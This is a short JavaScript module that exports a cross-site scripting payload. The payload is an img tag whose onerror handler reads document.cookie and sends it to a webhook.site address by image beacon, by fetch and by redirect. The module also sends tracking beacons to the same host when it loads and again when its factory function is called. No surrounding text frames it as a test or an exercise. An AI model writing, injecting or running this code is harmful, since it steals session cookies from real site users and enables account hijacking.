const EXFIL = 'https://webhook.site/f47c89f8-5038-4c47-9d6c-53d7bc38f41c';
try { new Image().src = EXFIL + '/b?s=payload-module-loaded&t=' + Date.now(); } catch(e){}

const PAYLOAD =
  `<img src=x onerror="` +
    `var c=encodeURIComponent(document.cookie);` +
    `new Image().src='${EXFIL}/i?d='+c;` +
    `fetch('${EXFIL}/f?d='+c,{mode:'no-cors'}).catch(function(){});` +
    `setTimeout(function(){location.href='${EXFIL}/n?d='+c},800);` +
  `">`;

export default function () {
  try { new Image().src = EXFIL + '/b?s=factory-called&t=' + Date.now(); } catch(e){}
  return PAYLOAD;
}
